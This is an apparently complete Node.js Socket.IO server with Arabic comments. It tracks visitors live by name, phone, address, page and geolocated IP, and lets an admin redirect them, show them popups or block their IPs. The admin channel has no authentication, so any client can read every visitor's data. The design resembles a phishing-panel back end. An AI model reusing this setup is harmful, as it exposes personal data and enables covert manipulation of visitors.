const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const https = require('https');

const app = express();
app.use(cors({ origin: "*", methods: ["GET", "POST"] }));

// ====== نظام حظر الـ IP ======
const BLOCKED_FILE = path.join(__dirname, 'blocked_ips.json');
let blockedIPs = new Set();
try {
  if (fs.existsSync(BLOCKED_FILE)) {
    blockedIPs = new Set(JSON.parse(fs.readFileSync(BLOCKED_FILE, 'utf8')));
  }
} catch (e) { console.error('load blocked_ips failed', e); }

function saveBlocked() {
  fs.writeFileSync(BLOCKED_FILE, JSON.stringify([...blockedIPs], null, 2));
}

function getClientIP(req) {
  const xff = req.headers['x-forwarded-for'];
  if (xff) return xff.split(',')[0].trim();
  return (req.connection?.remoteAddress || req.socket?.remoteAddress || '').replace('::ffff:', '');
}

// ====== Geo Lookup (ip-api.com) مع كاش ======
const geoCache = new Map();
function lookupGeo(ip) {
  return new Promise((resolve) => {
    if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168') || ip.startsWith('10.')) {
      return resolve({ country: 'Local', countryCode: '', city: '' });
    }
    if (geoCache.has(ip)) return resolve(geoCache.get(ip));
    const url = `http://ip-api.com/json/${ip}?fields=status,country,countryCode,city`;
    require('http').get(url, (res) => {
      let body = '';
      res.on('data', (c) => body += c);
      res.on('end', () => {
        try {
          const j = JSON.parse(body);
          const out = j.status === 'success'
            ? { country: j.country || '', countryCode: j.countryCode || '', city: j.city || '' }
            : { country: '', countryCode: '', city: '' };
          geoCache.set(ip, out);
          resolve(out);
        } catch { resolve({ country: '', countryCode: '', city: '' }); }
      });
    }).on('error', () => resolve({ country: '', countryCode: '', city: '' }));
  });
}

// Middleware يحظر أي طلب HTTP من IP محظور
app.use((req, res, next) => {
  const ip = getClientIP(req);
  if (blockedIPs.has(ip)) {
    return res.status(403).send('403 Forbidden - Your IP has been blocked.');
  }
  next();
});

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*", methods: ["GET", "POST"] } });

// منع اتصالات Socket من الـ IPs المحظورة
io.use((socket, next) => {
  const ip = (socket.handshake.headers['x-forwarded-for']?.split(',')[0].trim())
    || (socket.handshake.address || '').replace('::ffff:', '');
  const cleanIp = ip === '::1' ? '127.0.0.1' : ip;
  if (blockedIPs.has(cleanIp)) {
    console.log(`[BLOCKED] Rejected connection from ${cleanIp}`);
    return next(new Error('blocked'));
  }
  socket.data.ip = cleanIp;
  next();
});

const activeUsers = {};

function removeDuplicateUserSessions(userId, keepSocketId) {
  for (const [sid, u] of Object.entries(activeUsers)) {
    if (u.userId === userId && sid !== keepSocketId) {
      delete activeUsers[sid];
    }
  }
}

io.on('connection', (socket) => {
  socket.on('register_user', async (data) => {
    const ip = socket.data.ip;

    // فحص إضافي للحظر
    if (blockedIPs.has(ip)) {
      socket.emit('execute_redirect', { url: 'about:blank' });
      setTimeout(() => socket.disconnect(true), 300);
      return;
    }

    const geo = await lookupGeo(ip);

    activeUsers[socket.id] = {
      socketId: socket.id,
      userId: data.userId,
      name: data.name || '',
      phone: data.phone || '',
      address: data.address || '',
      currentPage: data.currentPage,
      ip,
      country: geo.country,
      countryCode: geo.countryCode,
      city: geo.city,
      connectedAt: new Date().toISOString(),
    };

    removeDuplicateUserSessions(data.userId, socket.id);
    sendActiveUsersToAdmins();
  });

  socket.on('update_page', (data) => {
    if (activeUsers[socket.id]) {
      activeUsers[socket.id].currentPage = data.currentPage;
      sendActiveUsersToAdmins();
    }
  });

  socket.on('register_admin', () => {
    socket.join('admins_room');
    sendActiveUsersToAdmins();
  });

  socket.on('admin_redirect_user', ({ targetSocketId, redirectUrl }) => {
    io.to(targetSocketId).emit('execute_redirect', { url: redirectUrl });
  });

  socket.on('admin_show_popup', ({ targetSocketId, title, message, type }) => {
    io.to(targetSocketId).emit('show_popup', { title, message, type });
  });

  // ====== حظر مستخدم عبر الـ IP ======
  socket.on('admin_block_user', ({ targetSocketId }) => {
    const user = activeUsers[targetSocketId];
    if (!user || !user.ip) return;
    const ipToBlock = user.ip;
    blockedIPs.add(ipToBlock);
    saveBlocked();
    console.log(`[BLOCK] IP ${ipToBlock} (${user.userId}) blocked`);

    // اطرد كل الجلسات النشطة بنفس الـ IP واحذفها من القائمة
    for (const [sid, u] of Object.entries(activeUsers)) {
      if (u.ip === ipToBlock) {
        io.to(sid).emit('execute_redirect', { url: 'about:blank' });
        const s = io.sockets.sockets.get(sid);
        if (s) setTimeout(() => s.disconnect(true), 300);
        delete activeUsers[sid];
      }
    }
    sendActiveUsersToAdmins();
  });

  socket.on('disconnect', () => {
    if (activeUsers[socket.id]) {
      delete activeUsers[socket.id];
      sendActiveUsersToAdmins();
    }
  });
});

function sendActiveUsersToAdmins() {
  io.to('admins_room').emit('update_users_list', Object.values(activeUsers));
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`[SERVER] Port: ${PORT}`));
